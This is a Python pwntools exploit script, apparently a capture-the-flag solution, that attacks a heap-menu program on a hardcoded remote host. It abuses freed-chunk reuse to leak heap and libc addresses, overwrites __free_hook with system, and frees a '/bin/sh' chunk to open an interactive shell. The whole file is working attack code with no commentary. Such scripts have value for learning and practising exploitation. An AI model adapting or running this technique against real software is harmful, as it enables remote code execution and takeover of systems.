from pwn import *

binary = ELF("./pwn")
context.binary = binary
libc = ELF('./libc.so.6')

if True:
    io = remote ("52.152.231.198",8081)
else:
    # context.log_level = "debug"
    # context.terminal = ['tmux', 'splitw', '-h']
    io = binary.process()

def add(idx,size):
    io.recvuntil(">> \n")
    io.sendline(str(1))
    io.recvuntil("input index\n")
    io.sendline(str(idx))
    io.recvuntil("input size\n")
    io.sendline(str(size))
def delete(idx):
    io.recvuntil(">> \n")
    io.sendline(str(2))
    io.recvuntil("input index\n")
    io.sendline(str(idx))
def edit(idx,data):
    io.recvuntil(">> \n")
    io.sendline(str(3))
    io.recvuntil("input index\n")
    io.sendline(str(idx))
    io.recvuntil("input content\n")
    io.send(str(data))
def show(idx):
    io.recvuntil(">> \n")
    io.sendline(str(4))
    io.recvuntil("input index\n")
    io.sendline(str(idx))
    return io.recvline().strip()
def addname(name):
    io.recvuntil(">> \n")
    io.sendline(str(5))
    io.recvuntil("your name:\n")
    io.sendline(str(name))
def showname():
    io.recvuntil(">> \n")
    io.sendline(str(6))

p = io
for i in range(9):
    add(i, 0x28)

for i in range(9):
    delete(i)

leak = u64(show(1).ljust(8,'\x00'))
print hex(leak)

add(2, 0x40)
addname('z')
libc.address = (u64(show(7).ljust(8,'\x00')) - libc.symbols['__malloc_hook']) & 0xfffffffffffff000
print hex(libc.address)
for i in range(5): add(0, 0x28)
delete(8)
add(0, 0x58)
edit(0, p64(0)*4+p64(0x31)+p64(libc.symbols['__free_hook']-0x8))
for i in range(2): add(1, 0x28)
edit(1, p64(libc.symbols['system']))
edit(0, p64(0)*4+p64(0x31)+'/bin/sh\x00')
delete(8)

io.interactive()
